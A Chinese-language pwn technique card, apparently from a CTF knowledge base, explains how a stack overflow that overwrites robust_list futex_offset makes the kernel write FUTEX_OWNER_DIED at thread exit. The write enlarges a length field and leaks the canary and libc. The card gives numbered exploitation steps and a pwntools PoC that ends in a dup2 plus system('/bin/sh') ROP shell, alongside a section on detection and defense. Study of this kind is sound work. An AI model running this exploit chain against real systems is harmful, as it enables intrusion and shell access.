---
id: binary-pwn-stack-robust-list-offset-futex-owner-died-arbitrary-write
title: robust_list offset 可控：线程退出把任意地址写成 FUTEX_OWNER_DIED，放大 BSS 长度字段后泄露 canary/libc
type: scenario
domain: binary
path: binary/pwn/stack
technique: robust-list-offset-futex-owner-died-arbitrary-write
aliases:
- robust_list 任意写
- FUTEX_OWNER_DIED
- set_robust_list
- futex 线程退出写
- offset 字段控制
- 栈溢出改 robust_list
tags:
- pwn
- linux
- futex
- robust-list
- arbitrary-write
- stack-overflow
- info-leak
- ret2libc
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T10:12:39+08:00'
  notes: 已对照 SyncVault 段核对：set_robust_list futex_offset 覆盖、线程退出写 FUTEX_OWNER_DIED、BSS 长度放大、canary 0x408/libc 0xeb8/0x60d88、echo ROP 均吻合；PoC 未执行
---

## 一句话结论

`set_robust_list(head, len)` 注册的 `robust_list_head` 含 `next` 与 `futex_offset` 字段；线程退出时内核遍历该链表，按 `futex_offset` 计算 futex 字地址，若该字等于当前线程 TID 就写入 `FUTEX_OWNER_DIED`（0x40000000）。如果栈溢出能覆盖 `head->futex_offset`，就能让内核在任意地址写入 0x40000000；把 BSS 中原本等于 TID 的长度字段放大后，snapshot 功能可泄露栈 canary 与 libc，再用 echo 的栈溢出 ROP 提权。

## 原理

- **robust futex 生命周期**：`set_robust_list` 让内核在进程/线程退出时处理“持锁线程死亡”的 futex：遍历 `robust_list_head.list`，对每个节点计算用户态 futex 字地址，读取其值；若等于该线程 TID，则用 `cmpxchg` 写入 `FUTEX_OWNER_DIED | TID`（至少置 `FUTEX_OWNER_DIED` 位，值为 0x40000000 量级）。
- **地址由 offset 决定**：内核用链表节点地址减去/加上 `head->futex_offset` 得到 futex 字地址。`futex_offset` 是用户态结构体字段，本应由 `set_robust_list` 的调用者正确设置；若攻击者能改它，就能把“目标 futex 字”指向任意可写地址。
- **前置条件**：目标地址原值必须等于当前线程 TID（否则 `cmpxchg` 不成立，不写入）。示例程序在 BSS 中大量使用“size”字段，正常运行时这些字段可能保存当前线程 TID（或可通过 SET 命令写成 TID）；先让字段等于 TID，再触发退出，就能把它改成 0x40000000。
- **为什么能放大**：0x40000000 远大于正常长度（如 0x10/0x18/0x20）。把某个全局 size 改成这个值后，snapshot 的 `malloc(size)` 与 `write(fd, buf, size)` 会复制远超预期的内存（直到 fd 写失败/循环），从而把 BSS 后面的栈 canary、libc 指针一起泄露出来；示例读取 0x1000 字节即可拿到 canary 和 libc。
- **最终栈溢出**：echo 功能存在栈溢出，拿到 canary/libc 后构造 `dup2` + `system("/bin/sh")` 的 ROP；因为 snapshot 的写循环可能不退出，示例还构造了写失败死循环以避免进程提前退出。

## 触发条件

- 程序暴露可注册/可覆盖 `robust_list_head` 的栈缓冲区（如 sync 功能把最多 0x38 字节复制到包含 robust_list 结构的栈变量）。
- 目标字（长度字段）可控为当前线程 TID；程序存在把该字段用于后续 `malloc`/`write` 长度的路径。
- 线程退出（`pthread_exit`/进程退出/`QUIT`）会触发内核 robust list 清理；目标内核启用 `CONFIG_FUTEX` 与 robust list。
- 有后续泄露/溢出功能（snapshot/echo）可利用放大后的长度。

## 利用步骤

1. **获取 TID**：通过 sync 功能的小块同步返回 `TID=%d`，记录当前线程 TID。
2. **把目标长度字段设为 TID**：用 SET 命令把 BODY/HEAD/IO 等字段写成 TID（示例 `set_body(tid)`、`set_head(tid)`、`set_size(tid)`）。
3. **覆盖 robust_list offset**：发送 sync 数据，利用栈溢出越过缓冲区写入 `robust_list_head.futex_offset`，使其指向目标字段地址（示例 `payload = b'a'*0x30 + p64(BODY_OFFSET/HEAD_OFFSET/IO_OFFSET)`）。
4. **退出线程触发写**：发送 `QUIT` 或关闭连接，让线程退出；内核遍历 robust list，把目标字段从 TID 改成 `FUTEX_OWNER_DIED`（0x40000000 量级）。
5. **泄露内存**：调用 snapshot，程序按被放大的 size `malloc` 并 `write` 内存；接收 0x1000 字节，按偏移取出 canary（示例 0x408）和 libc 指针（示例 0xeb8，减去 0x60d88 得 libc 基址）。
6. **echo 栈溢出 ROP**：构造 `payload = b'a'*0x400 + p64(0) + p64(canary) + p64(0)*5 + rop`，ROP 先 `dup2(4,0/1/2)` 再把 fd 4 重定向到标准输入输出，最后 `system("/bin/sh")`。
7. **交互拿 shell**：echo 发送 payload 后进入交互。

## PoC

```python
def get_tid(io):
    set_sync_size(io, 0x10)
    sync_task(io, b'a'*0x10)
    io.recvuntil(b"TID=")
    return int(io.recvline().strip(), 10)

BODY_OFFSET, HEAD_OFFSET, IO_OFFSET = 0x10, 0x18, 0x20

s1 = make_conn(); tid = get_tid(s1)
set_body(s1, tid)                     # 目标字段先等于 TID
set_sync_size(s1, 0x100)
sync_task(s1, b'a'*0x30 + p64(BODY_OFFSET))   # 覆盖 robust_list offset
quit_con(s1); s1.close()              # 线程退出 -> 写 FUTEX_OWNER_DIED

# 对 HEAD/IO 重复 ...
leak_s = make_conn(); snapshot(leak_s)
leakinfo = leak_s.recv(0x1000)
canary = u64(leakinfo[0x408:0x410])
libc_base = u64(leakinfo[0xeb8:0xec0]) - 0x60d88

rop  = p64(libc_base+0x10f78b) + p64(4) + p64(libc_base+0x110a7d) + p64(0) + p64(libc_base+0x116990)  # dup2(4,0)
rop += p64(libc_base+0x10f78b) + p64(4) + p64(libc_base+0x110a7d) + p64(1) + p64(libc_base+0x116990)
rop += p64(libc_base+0x10f78b) + p64(4) + p64(libc_base+0x110a7d) + p64(2) + p64(libc_base+0x116990)
rop += p64(libc_base+0x10f78b) + p64(libc_base+0x1cb42f) + p64(libc_base+0x58750)  # system("/bin/sh")
payload = (b'a'*0x400 + p64(0) + p64(canary) + p64(0)*5 + rop).ljust(0x1000, b'\x00')
echo(make_conn(), payload)
```

偏移/系统调用号依目标程序与内核版本而定；示例使用 `set_robust_list`（syscall 273）与 `futex`。本卡不执行 PoC。

## 变体与关联

- **只写固定值**：robust list 清理只能写 `FUTEX_OWNER_DIED` 位，不能写任意值；适合放大长度/标志字段，或把 0/小值改成大值。若需要精确值，可配合其它原语。
- **其它退出写**：`clear_child_tid` 在线程退出时向指定地址写 0；`set_tid_address` 也可用于“退出时写零”的破坏。robust list 是“写非零固定值”的补充。
- **目标字段选择**：全局 size、引用计数、状态机、指针低字节等；只要写入 0x40000000 能造成长度放大/状态跳转即可。
- **关联**：[[binary-pwn-stack-rbp-arbitrary-write-got-read-write-dlresolve-chunked-rop]]（栈溢出后的任意写/ROP）、[[binary-pwn-stack-pivot-leave-ret-bss]]（栈迁移）、[[binary-pwn-kernel-sock-refcount-race-lock-sock-double-free]]（内核对象生命周期利用对照）。
- **边界**：需要能覆盖 robust_list 结构且目标字预先等于 TID；内核若对 robust list 做额外校验/清零，或程序在退出前清理 robust list，利用失效。

## 检测与防御

- **代码修复**：sync 等复制路径严格限制长度，确保不越界写入包含 `robust_list_head` 的栈变量；不要把 `set_robust_list` 的 head 放在可被用户数据覆盖的缓冲区。
- **初始化/清理**：注册前把 `futex_offset` 固定为合法值，退出前 `set_robust_list(NULL, 0)` 注销；对长度字段使用有符号/范围校验。
- **编译加固**：栈 canary、`-D_FORTIFY_SOURCE=2`、CFI；对关键全局长度字段加冗余校验。
- **检测**：线程退出后全局长度字段异常变为 0x40000000 量级；snapshot 等接口出现超大 `malloc`/`write`；进程在 futex 清理路径出现异常。审计 `set_robust_list` 与可覆盖栈结构的位置。
- **内核侧**：保持 futex/robust list 代码更新；对异常 futex 地址的写入可用 KASAN/ hardened usercopy 观测（用户态结构体覆盖属于应用漏洞，内核难以完全防御）。
